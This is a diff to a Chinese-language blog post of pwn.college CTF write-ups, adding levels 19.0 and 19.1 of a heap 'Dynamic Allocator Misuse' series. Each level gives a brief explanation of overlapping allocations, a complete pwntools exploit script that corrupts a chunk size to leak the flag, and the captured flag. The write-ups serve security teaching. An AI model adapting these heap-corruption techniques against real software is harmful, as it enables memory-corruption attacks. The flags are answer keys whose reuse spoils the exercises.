@@ -1,7 +1,7 @@
 ---
 title: "Write-ups: Program Security (Dynamic Allocator Misuse) series"
 published: 2025-09-08
-updated: 2025-10-10
+updated: 2025-10-13
 description: "Write-ups for pwn.college binary exploitation series."
 image: "https://ghproxy.net/https://raw.githubusercontent.com/CuB3y0nd/picx-images-hosting/master/.41yct5dsj8.avif"
 tags: ["Pwn", "Write-ups", "Heap"]
@@ -4462,3 +4462,249 @@ if __name__ == "__main__":
 ## Flag
 
 :spoiler[`pwn.college{8b5lkMBpAAfr5wN2o6YrXmK9nLw.dNTO0MDL5cTNxgzW}`]
+
+# Level 19.0
+
+## Information
+
+- Category: Pwn
+
+## Description
+
+> Leverage overlapping allocations to obtain the flag.
+
+## Write-up
+
+Description 告诉我们需要使用 overlapping，那就先去了解一下那是个啥，我写了 [Mirror, Mirror on the Heap](/posts/pwn-notes/pwn-trick-notes/#mirror-mirror-on-the-heap) 。
+
+然后就很简单了，篡改 inuse chunk 的 size 再输出就好了，很简单的一个概念。
+
+## Exploit
+
+```python
+#!/usr/bin/env python3
+
+from pwn import (
+    args,
+    context,
+    flat,
+    process,
+    raw_input,
+    remote,
+)
+
+
+FILE = "/challenge/babyheap_level19.0"
+HOST, PORT = "localhost", 1337
+
+context(log_level="debug", binary=FILE, terminal="kitty")
+
+elf = context.binary
+
+
+def malloc(idx, size):
+    target.sendlineafter(b": ", b"malloc")
+    target.sendlineafter(b"Index: ", str(idx).encode())
+    target.sendlineafter(b"Size: ", str(size).encode())
+
+
+def free(idx):
+    target.sendlineafter(b": ", b"free")
+    target.sendlineafter(b"Index: ", str(idx).encode())
+
+
+def safe_read(idx, data):
+    target.sendlineafter(b": ", b"safe_read")
+    target.sendlineafter(b"Index: ", str(idx).encode())
+    target.sendline(data)
+
+
+def safe_write(idx):
+    target.sendlineafter(b": ", b"safe_write")
+    target.sendlineafter(b"Index: ", str(idx).encode())
+
+
+def read_flag():
+    target.sendlineafter(b": ", b"read_flag")
+
+
+def quit():
+    target.sendlineafter(b": ", b"quit")
+
+
+def mangle(pos, ptr, shifted=1):
+    if shifted:
+        return pos ^ ptr
+    return (pos >> 12) ^ ptr
+
+
+def demangle(pos, ptr, shifted=1):
+    if shifted:
+        return mangle(pos, ptr)
+    return mangle(pos, ptr, 0)
+
+
+def launch():
+    global target
+    if args.L:
+        target = process(FILE)
+    else:
+        target = remote(HOST, PORT)
+
+
+def main():
+    launch()
+
+    malloc(0, 0x20)
+    malloc(1, 0)
+    read_flag()
+
+    payload = flat(
+        b"A" * 0x20,
+        0,
+        0x61,
+    )
+    # raw_input("DEBUG")
+    safe_read(0, payload)
+
+    free(1)
+    raw_input("DEBUG")
+    malloc(0, 0x50)
+    safe_write(0)
+    target.recvuntil(b"pwn.college{")
+    flag = target.recvline().decode()
+    target.success(f"pwn.college{{{flag}")
+    quit()
+
+    target.interactive()
+
+
+if __name__ == "__main__":
+    main()
+```
+
+## Flag
+
+:spoiler[`pwn.college{UyW-UEWgMm10Cadm41NCv96TtqR.dRTO0MDL5cTNxgzW}`]
+
+# Level 19.1
+
+## Information
+
+- Category: Pwn
+
+## Description
+
+> Leverage overlapping allocations to obtain the flag.
+
+## Write-up
+
+参见 [Level 19.0](#level-190)。
+
+## Exploit
+
+```python
+#!/usr/bin/env python3
+
+from pwn import (
+    args,
+    context,
+    flat,
+    process,
+    raw_input,
+    remote,
+)
+
+
+FILE = "/challenge/babyheap_level19.1"
+HOST, PORT = "localhost", 1337
+
+context(log_level="debug", binary=FILE, terminal="kitty")
+
+elf = context.binary
+
+
+def malloc(idx, size):
+    target.sendlineafter(b": ", b"malloc")
+    target.sendlineafter(b"Index: ", str(idx).encode())
+    target.sendlineafter(b"Size: ", str(size).encode())
+
+
+def free(idx):
+    target.sendlineafter(b": ", b"free")
+    target.sendlineafter(b"Index: ", str(idx).encode())
+
+
+def safe_read(idx, data):
+    target.sendlineafter(b": ", b"safe_read")
+    target.sendlineafter(b"Index: ", str(idx).encode())
+    target.sendline(data)
+
+
+def safe_write(idx):
+    target.sendlineafter(b": ", b"safe_write")
+    target.sendlineafter(b"Index: ", str(idx).encode())
+
+
+def read_flag():
+    target.sendlineafter(b": ", b"read_flag")
+
+
+def quit():
+    target.sendlineafter(b": ", b"quit")
+
+
+def mangle(pos, ptr, shifted=1):
+    if shifted:
+        return pos ^ ptr
+    return (pos >> 12) ^ ptr
+
+
+def demangle(pos, ptr, shifted=1):
+    if shifted:
+        return mangle(pos, ptr)
+    return mangle(pos, ptr, 0)
+
+
+def launch():
+    global target
+    if args.L:
+        target = process(FILE)
+    else:
+        target = remote(HOST, PORT)
+
+
+def main():
+    launch()
+
+    malloc(0, 0x20)
+    malloc(1, 0)
+    read_flag()
+
+    payload = flat(
+        b"A" * 0x20,
+        0,
+        0x61,
+    )
+    # raw_input("DEBUG")
+    safe_read(0, payload)
+
+    free(1)
+    raw_input("DEBUG")
+    malloc(0, 0x50)
+    safe_write(0)
+    target.recvuntil(b"pwn.college{")
+    flag = target.recvline().decode()
+    target.success(f"pwn.college{{{flag}")
+    quit()
+
+    target.interactive()
+
+
+if __name__ == "__main__":
+    main()
+```
+
+## Flag
+
+:spoiler[`pwn.college{ou87E6zOskHpMtWjDb0XpdVk9ub.dVTO0MDL5cTNxgzW}`]
